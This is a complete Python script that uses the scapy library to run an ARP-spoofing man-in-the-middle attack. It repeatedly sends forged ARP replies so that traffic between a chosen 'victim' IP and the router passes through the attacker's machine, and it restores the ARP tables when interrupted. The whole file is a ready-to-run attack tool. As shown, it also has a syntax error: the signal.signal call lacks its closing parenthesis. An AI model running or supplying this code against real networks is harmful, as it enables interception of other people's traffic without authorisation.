#!/usr/bin/python
from scapy.all import *
import argparse
import signal
import sys
import logging
import time
from threading import Thread

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-v", "--victimIP", help="Choose the victim IP address. Example: -v 192.168.0.5")
    parser.add_argument("-r", "--routerIP", help="Choose the router IP address. Example: -r 192.168.0.1")
    return parser.parse_args()
def getAttackerMAC(routerIP):
    return (Ether()/IP(dst=routerIP))[Ether].src
def originalMAC(ip):
    return sr1(ARP(pdst=ip,op=1), timeout=5, retry=3)[ARP].hwsrc
def poison(routerIP, victimIP, routerMAC, victimMAC, attackerMAC):
    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC, hwsrc=attackerMAC))
    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC, hwsrc=attackerMAC))
def restore(routerIP, victimIP, routerMAC, victimMAC):
    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=3)
    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC), count=3)
    sys.exit("losing...")
def main(args):
    if os.geteuid() != 0:
        sys.exit("[!] Please run as root")
    routerIP = args.routerIP
    victimIP = args.victimIP
    attackerMAC = getAttackerMAC(routerIP);
    routerMAC = originalMAC(args.routerIP)
    victimMAC = originalMAC(args.victimIP)
    def signal_handler(signal, frame):
        restore(routerIP, victimIP, routerMAC, victimMAC)
    signal.signal(signal.SIGINT, signal_handler
    while 1:
        poison(routerIP, victimIP, routerMAC, victimMAC, attackerMAC)
        time.sleep(1.5)
main(parse_args())
